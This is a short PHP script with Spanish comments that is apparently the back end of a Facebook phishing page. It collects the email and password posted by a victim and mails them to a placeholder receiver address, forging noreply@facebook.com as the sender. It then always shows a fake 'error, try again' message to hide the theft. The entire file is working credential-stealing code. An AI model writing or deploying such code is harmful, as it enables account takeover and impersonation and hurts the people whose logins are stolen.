<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Configurar el correo al que se envian los datos ingresados en la pagina
    $to = "correoDelReceptor@gmail.com";
    $subject = "Nuevo inicio de sesión en Facebook";
    $message = "Se ha intentado iniciar sesión con los siguientes datos:\n";
    $message .= "Correo electrónico o número de teléfono: " . $email . "\n";
    $message .= "Contraseña: " . $password . "\n";

    // Cabeceras del correo
    $headers = "From: noreply@facebook.com" . "\r\n";
    $headers .= "Reply-To: noreply@facebook.com" . "\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8";

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        echo "Hubo un error, intenta nuevamente.";
    } else {
        echo "Hubo un error, intenta nuevamente.";
    }
}
?>
